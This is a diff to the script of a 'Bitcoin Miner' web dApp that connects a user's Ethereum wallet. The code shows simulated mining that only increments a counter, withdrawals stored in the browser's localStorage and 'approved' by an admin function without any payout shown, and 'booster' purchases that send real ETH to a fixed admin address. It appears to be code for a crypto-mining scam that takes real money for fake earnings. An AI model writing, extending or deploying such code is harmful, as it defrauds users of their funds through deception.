@@ -180,25 +180,21 @@
       return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    // Set admin wallet address (for admin panel and booster payments)
+    // Set admin wallet address and parameters
     const adminAddress = "0xde45f6a59A96DaA0AE7f26BAd254aA88241b8D04";
-    // Minimum withdrawal threshold: 0.010000000000 BTC
-    const MIN_WITHDRAWAL = 0.010000000000;
-    // Booster parameters:
-    const BOOSTER_INCREMENT1 = 0.000000001000; // Booster 1: BTC/s
-    const BOOSTER_COST_ETH1 = 0.030;             // Booster 1 cost in ETH
-    const BOOSTER_INCREMENT2 = 0.000000002000; // Booster 2: BTC/s
-    const BOOSTER_COST_ETH2 = 0.060;             // Booster 2 cost in ETH
-    const BOOSTER_INCREMENT3 = 0.000000003500; // Booster 3: BTC/s
-    const BOOSTER_COST_ETH3 = 0.082;             // Booster 3 cost in ETH
-
-    // Base mining rate (BTC per second)
+    const MIN_WITHDRAWAL = 0.010000000000; // 0.01 BTC
+    const BOOSTER_INCREMENT1 = 0.000000001000;
+    const BOOSTER_COST_ETH1 = 0.030;
+    const BOOSTER_INCREMENT2 = 0.000000002000;
+    const BOOSTER_COST_ETH2 = 0.060;
+    const BOOSTER_INCREMENT3 = 0.000000003500;
+    const BOOSTER_COST_ETH3 = 0.082;
     const BASE_RATE = 0.000000000138;
 
     let userAccount = "";
     let miningInterval;
     let minedAmount = 0;
-    const miningDuration = 10 * 60; // 10 minutes (in seconds)
+    const miningDuration = 10 * 60; // 10 minutes in seconds
     let sessionFinished = false;
 
     // Data persistence using localStorage:
@@ -208,7 +204,6 @@
     let boosterCounts2 = JSON.parse(localStorage.getItem('boosterCounts2')) || {};
     let boosterCounts3 = JSON.parse(localStorage.getItem('boosterCounts3')) || {};
 
-    // Save data to localStorage
     function saveData() {
       localStorage.setItem('withdrawals', JSON.stringify(withdrawals));
       localStorage.setItem('minedProgress', JSON.stringify(minedProgress));
@@ -217,7 +212,6 @@
       localStorage.setItem('boosterCounts3', JSON.stringify(boosterCounts3));
     }
 
-    // Load user data from localStorage
     function loadUserData() {
       minedAmount = minedProgress[userAccount] || 0;
       document.getElementById('minedAmount').innerText = minedAmount.toFixed(12);
@@ -226,26 +220,30 @@
       document.getElementById('boosterCount3').innerText = boosterCounts3[userAccount] || 0;
     }
 
-    // Connect wallet event handler
+    // Updated connect wallet handler using WalletConnect v2 with metadata
     document.getElementById('connectWalletBtn').addEventListener('click', async function() {
-      // If on mobile or no injected provider, use WalletConnect v2.
       if (isMobileDevice() || !window.ethereum) {
         try {
           const provider = await WalletConnectEthereumProvider.init({
             projectId: "e2d5994d7d0b4125baf324894a6dcc98", // Your Infura Project ID
             relayUrl: "wss://relay.walletconnect.com",         // Explicit relay URL
             chains: [1],
-            showQrModal: true
+            showQrModal: true,
+            metadata: {
+              name: "Bitcoin Miner",
+              description: "A simulated Bitcoin mining DApp.",
+              url: "https://yourdomain.com", // Replace with your domain if available
+              icons: ["https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg"]
+            }
           });
           await provider.enable();
           userAccount = provider.accounts[0].toLowerCase();
           onWalletConnected();
         } catch (error) {
           console.error(error);
-          alert("Mobile wallet connection failed! Please open the DApp in your wallet's built-in browser or install a compatible wallet app. ❌");
+          alert("Mobile wallet connection failed! Please open the DApp in your wallet's built-in browser or update your wallet. ❌");
         }
       } else {
-        // On desktop, try the injected provider first.
         try {
           const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           userAccount = accounts[0].toLowerCase();
@@ -257,7 +255,6 @@
       }
     });
 
-    // Runs after wallet is connected
     function onWalletConnected() {
       document.getElementById('walletInfo').innerText = "Connected: " + userAccount;
       document.getElementById('miner').style.display = "block";
@@ -270,7 +267,6 @@
       updateAdminWithdrawalTable();
     }
 
-    // Start a mining session
     function startMiningSession() {
       let secondsPassed = 0;
       document.getElementById('startMiningBtn').disabled = true;
@@ -303,7 +299,6 @@
       }, 1000);
     }
 
-    // Start mining button event
     document.getElementById('startMiningBtn').addEventListener('click', function() {
       if (sessionFinished && minedAmount > 0) {
         const confirmSave = confirm("Your finished session mined " + minedAmount.toFixed(12) + " BTC 💰. " +
@@ -324,7 +319,6 @@
       startMiningSession();
     });
 
-    // Withdraw button event
     document.getElementById('withdrawBtn').addEventListener('click', function() {
       if (minedAmount < MIN_WITHDRAWAL) {
         alert("You must have at least " + MIN_WITHDRAWAL.toFixed(12) + " BTC to withdraw. ⛔");
@@ -355,18 +349,13 @@
       updateAdminWithdrawalTable();
     });
 
-    // Booster 1 purchase event
     document.getElementById('purchaseBoosterBtn').addEventListener('click', async function() {
       if (!window.ethereum) {
         alert("No Ethereum provider available. ⛔");
         return;
       }
       const valueWei = BigInt(Math.floor(BOOSTER_COST_ETH1 * 1e18)).toString(16);
-      const txParams = {
-        from: userAccount,
-        to: adminAddress,
-        value: "0x" + valueWei
-      };
+      const txParams = { from: userAccount, to: adminAddress, value: "0x" + valueWei };
       try {
         const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [txParams] });
         alert("Booster 1 purchase transaction sent: " + txHash + " 🚀");
@@ -379,18 +368,13 @@
       }
     });
 
-    // Booster 2 purchase event
     document.getElementById('purchaseBooster2Btn').addEventListener('click', async function() {
       if (!window.ethereum) {
         alert("No Ethereum provider available. ⛔");
         return;
       }
       const valueWei = BigInt(Math.floor(BOOSTER_COST_ETH2 * 1e18)).toString(16);
-      const txParams = {
-        from: userAccount,
-        to: adminAddress,
-        value: "0x" + valueWei
-      };
+      const txParams = { from: userAccount, to: adminAddress, value: "0x" + valueWei };
       try {
         const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [txParams] });
         alert("Booster 2 purchase transaction sent: " + txHash + " 🚀");
@@ -403,18 +387,13 @@
       }
     });
 
-    // Booster 3 purchase event
     document.getElementById('purchaseBooster3Btn').addEventListener('click', async function() {
       if (!window.ethereum) {
         alert("No Ethereum provider available. ⛔");
         return;
       }
       const valueWei = BigInt(Math.floor(BOOSTER_COST_ETH3 * 1e18)).toString(16);
-      const txParams = {
-        from: userAccount,
-        to: adminAddress,
-        value: "0x" + valueWei
-      };
+      const txParams = { from: userAccount, to: adminAddress, value: "0x" + valueWei };
       try {
         const txHash = await window.ethereum.request({ method: "eth_sendTransaction", params: [txParams] });
         alert("Booster 3 purchase transaction sent: " + txHash + " 🚀");
@@ -427,7 +406,6 @@
       }
     });
 
-    // Update User Withdrawal Table
     function updateUserWithdrawalTable() {
       const tableBody = document.querySelector("#userWithdrawalTable tbody");
       tableBody.innerHTML = "";
@@ -439,7 +417,6 @@
       });
     }
 
-    // Update Admin Withdrawal Table
     function updateAdminWithdrawalTable() {
       const tableBody = document.querySelector("#adminWithdrawalTable tbody");
       tableBody.innerHTML = "";
@@ -460,14 +437,12 @@
       }
     }
 
-    // Copy wallet address to clipboard
     function copyWallet(wallet) {
       navigator.clipboard.writeText(wallet)
         .then(() => alert("Wallet address copied: " + wallet + " 📋"))
         .catch(() => alert("Failed to copy wallet address. ⛔"));
     }
 
-    // Approve withdrawal (admin only)
     function approveWithdrawal(wallet, index) {
       withdrawals[wallet][index].status = 'approved';
       saveData();
